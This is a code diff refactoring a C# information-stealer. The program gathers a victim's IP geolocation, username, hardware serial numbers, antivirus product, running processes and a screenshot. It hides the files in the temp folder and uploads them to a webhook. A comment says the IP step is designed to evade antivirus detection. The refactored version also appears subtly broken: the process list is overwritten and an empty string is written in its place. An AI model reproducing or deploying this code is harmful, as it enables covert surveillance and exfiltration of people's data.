@@ -1,14 +1,10 @@
 using System;
-using System.Collections.Generic;
 using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
-using System.Linq;
 using System.Management;
 using System.Net;
-using System.Text;
-using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace testing1AVE
@@ -16,6 +12,7 @@ namespace testing1AVE
     class Program
     {
         private static readonly string webhook = "";
+
         static void Main(string[] args)
         {
             try
@@ -29,54 +26,40 @@ namespace testing1AVE
 
                 // Start Of GeoLocation Grabber
 
-                using (WebClient wc = new WebClient())
+                using (var wc = new WebClient())
                 {
-                    string information = wc.DownloadString("LINK_HERE"); // User Unknown IP Grabber (Easy To Make) To Avoid AV Detections.
+                    var information = wc.DownloadString("LINK_HERE"); // User Unknown IP Grabber (Easy To Make) To Avoid AV Detections.
                     information = information.Replace("<br>", Environment.NewLine);
                     iGlI = information;
-                    wc.Dispose();
                 }
 
                 // End Of GeoLocation Grabber
 
                 // Start Of PC Information Grabber
 
-                var cUser = "User: " + Environment.UserName;
+                foreach (var queryObj in new ManagementObjectSearcher(new SelectQuery("Win32_BaseBoard")).Get())
+                    mBd = $"(MB) Serial Number: {queryObj.Properties["SerialNumber"].Value.ToString()}";
 
-                foreach (ManagementObject queryObj in new ManagementObjectSearcher(new SelectQuery("Win32_BaseBoard")).Get())
-                {
-                    mBd = "(MB) Serial Number: " + queryObj.Properties["SerialNumber"].Value.ToString();
-                }
-
-                foreach (ManagementObject managObj in new ManagementClass("win32_processor").GetInstances())
-                {
-                    cpu = "(CPU) Name: " + managObj.Properties["Name"].Value.ToString() + Environment.NewLine + "(CPU) Cores: " + managObj.Properties["NumberOfCores"].Value.ToString();
-                }
+                foreach (var managObj in new ManagementClass("win32_processor").GetInstances())
+                    cpu = $"(CPU) Name: {managObj.Properties["Name"].Value.ToString()}\n(CPU) Cores: {managObj.Properties["NumberOfCores"].Value.ToString()}";
 
                 using (var searcher = new ManagementObjectSearcher("select * from Win32_VideoController"))
-                {
-                    foreach (ManagementObject managObj in searcher.Get())
-                    {
-                        gpu = "(GPU) Name: " + managObj.Properties["Name"].Value.ToString() + Environment.NewLine + "(GPU) Version: " + managObj.Properties["DriverVersion"].Value.ToString();
-                    }
-                    searcher.Dispose();
-                }
+                    foreach (var managObj in searcher.Get())
+                        gpu = $"(GPU) Name: {managObj.Properties["Name"].Value.ToString()}\n(GPU) Version: {managObj.Properties["DriverVersion"].Value.ToString()}";
 
-                foreach (ManagementObject managObj in new ManagementClass("Win32_BIOS").GetInstances())
-                {
-                    bios = "Serial Number (BIOS): " + managObj.Properties["SerialNumber"].Value.ToString();
-                }
+                foreach (var managObj in new ManagementClass("Win32_BIOS").GetInstances())
+                    bios = $"Serial Number (BIOS): {managObj.Properties["SerialNumber"].Value.ToString()}";
 
-                string pathS = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
-                using (var searcher = new ManagementObjectSearcher(pathS, "SELECT * FROM AntivirusProduct"))
+                using (var searcher = new ManagementObjectSearcher($@"\\{Environment.MachineName}\root\SecurityCenter2", "SELECT * FROM AntivirusProduct"))
                 {
                     foreach (var instance in searcher.Get())
                     {
                         instance.GetPropertyValue("displayName");
                         avN = instance.GetPropertyValue("displayName").ToString();
                     }
-                    if (avN == "") avN = "N/a";
-                    searcher.Dispose();
+
+                    if (avN == "")
+                        avN = "N/a";
                 }
 
                 // End Of PC Information Grabber
@@ -84,80 +67,58 @@ namespace testing1AVE
                 // Start Of Current Proccess Activities
 
                 var rP = "";
-                foreach (Process proc in Process.GetProcesses())
+                foreach (var proc in Process.GetProcesses())
+                    rP = $"{""}{proc.ProcessName}\n";
+
+                switch (File.Exists($"{Path.GetTempPath()}Proccesses.txt"))
                 {
-                    rP = rP + proc.ProcessName + Environment.NewLine;
+                    case true:
+                        File.Delete($"{Path.GetTempPath()}Proccesses.txt");
+                        using (var file = new StreamWriter($"{Path.GetTempPath()}Proccesses.txt"))
+                            file.WriteLine("");
+                        break;
+                    default:
+                        using (var file = new StreamWriter($"{Path.GetTempPath()}Proccesses.txt"))
+                            file.WriteLine("");
+                        break;
                 }
 
-                if (!File.Exists(Path.GetTempPath() + "Proccesses.txt"))
-                {
-                    using (StreamWriter file = new StreamWriter(Path.GetTempPath() + "Proccesses.txt"))
-                    {
-                        file.WriteLine(rP);
-                        file.Dispose();
-                    }
-                }
-                else
-                {
-                    File.Delete(Path.GetTempPath() + "Proccesses.txt");
-                    using (StreamWriter file = new StreamWriter(Path.GetTempPath() + "Proccesses.txt"))
-                    {
-                        file.WriteLine(rP);
-                        file.Dispose();
-                    }
-                }
-
-                var attr = File.GetAttributes(Path.GetTempPath() + "Proccesses.txt");
-                if ((attr & FileAttributes.Hidden) != FileAttributes.Hidden)
-                {
-                    File.SetAttributes(Path.GetTempPath() + "Proccesses.txt", FileAttributes.Hidden);
-                }
+                if ((File.GetAttributes($"{Path.GetTempPath()}Proccesses.txt") & FileAttributes.Hidden) != FileAttributes.Hidden)
+                    File.SetAttributes($"{Path.GetTempPath()}Proccesses.txt", FileAttributes.Hidden);
 
                 // End Of Current Process Activities
 
                 // Start Of Screenshot
 
-                Rectangle b = Screen.GetBounds(Point.Empty);
-                using (Bitmap bitmap = new Bitmap(b.Width, b.Height))
+                using (var bitmap = new Bitmap(Screen.GetBounds(Point.Empty).Width, Screen.GetBounds(Point.Empty).Height))
                 {
-                    using (Graphics g = Graphics.FromImage(bitmap))
-                    {
-                        g.CopyFromScreen(Point.Empty, Point.Empty, b.Size);
-                        g.Dispose();
-                    }
-                    bitmap.Save(Path.GetTempPath() + "Screen.jpg", ImageFormat.Jpeg);
-                    File.SetAttributes(Path.GetTempPath() + "Screen.jpg", FileAttributes.Hidden);
-                    bitmap.Dispose();
+                    using (var gfx = Graphics.FromImage(bitmap))
+                        gfx.CopyFromScreen(Point.Empty, Point.Empty, Screen.GetBounds(Point.Empty).Size);
+
+                    bitmap.Save($"{Path.GetTempPath()}Screen.jpg", ImageFormat.Jpeg);
+                    File.SetAttributes($"{Path.GetTempPath()}Screen.jpg", FileAttributes.Hidden);
                 }
 
                 // End Of Screenshot
 
                 // Start Of Sending Information
 
-                using (WebClient wc = new WebClient())
+                using (var wc = new WebClient())
                 {
                     wc.UploadValues(webhook, new System.Collections.Specialized.NameValueCollection()
                     {
-                        {
-                            "username",
-                            "Logs"
-                        },
-                        {
-                            "content",
-                            $">>> -----GeoLocation Info-----{Environment.NewLine + iGlI + Environment.NewLine + Environment.NewLine}-----PC Info-----{Environment.NewLine + cUser + Environment.NewLine + mBd + Environment.NewLine + cpu + Environment.NewLine + gpu + Environment.NewLine + bios + Environment.NewLine + avN}"
-                        }
+                        { "username", "Logs" },
+                        { "content", $">>> -----GeoLocation Info-----{$"\n{iGlI}\n\n"}-----PC Info-----{$"\n{$"User: {Environment.UserName}"}\n{mBd}\n{cpu}\n{gpu}\n{bios}\n{avN}"}" }
                     });
-                    wc.UploadFile(webhook, Path.GetTempPath() + "Proccesses.txt");
-                    wc.UploadFile(webhook, Path.GetTempPath() + "Screen.jpg");
-                    wc.Dispose();
-                }
 
+                    wc.UploadFile(webhook, $"{Path.GetTempPath()}Proccesses.txt");
+                    wc.UploadFile(webhook, $"{Path.GetTempPath()}Screen.jpg");
+                }
+                
                 // End Of Sending Information
             }
-            catch (Exception ex)
-            {
-                Console.WriteLine(ex.Message);
-            }
+            catch (Exception ex) { Console.WriteLine($"There was an exception: {ex.Message}"); }
+
             Console.ReadLine();
         }
     }
